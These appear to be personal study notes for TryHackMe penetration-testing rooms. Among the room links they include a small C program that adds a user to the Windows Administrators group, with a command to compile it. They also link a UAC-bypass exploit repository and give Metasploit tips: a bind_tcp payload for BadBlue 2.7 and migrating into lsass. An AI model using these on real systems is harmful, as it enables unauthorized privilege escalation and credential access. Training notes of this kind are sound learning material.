### THM
- [Bolt](https://tryhackme.com/r/room/bolt)
- [Ice](https://tryhackme.com/r/room/ice)
- [Internal](https://tryhackme.com/r/room/internal)
- [blog](https://tryhackme.com/r/room/blog)
- [post-Exploitation](https://tryhackme.com/r/room/postexploit)
- [Hack Smarter Security](https://tryhackme.com/r/room/hacksmartersecurity)
	- Instead, I chose to create an executable that will add the tyler user to the Administrators local group.
	- Writing a very simple C code that does this.
	
	`#include <stdlib.h>`  
	`int main() {` 
		`system("cmd.exe /c net localgroup Administrators tyler /add");` 
		`return 0;` 
	`}`
	- Now Compiling it into an executable for Windows.
		x86_64-w64-mingw32-gcc-win32  payload.c -o payload.exe   

- [Windows PrivSec Aena](https://tryhackme.com/r/room/windowsprivescarena) 
- [Windows Privsec](https://tryhackme.com/r/room/windows10privesc)
- [blaster](https://tryhackme.com/r/room/blaster)
	- https://github.com/nobodyatall648/CVE-2019-1388 -- Bypass UAC


## Notes
- https://github.com/y3t1sec/ejpt_study_notes


### Tips
- for badblue 2.7 
	- set PAYLOAD windows/meterpreter/bind_tcp
- Always migrate to explorer.exe or lsass 
	- ps -S lsass.exe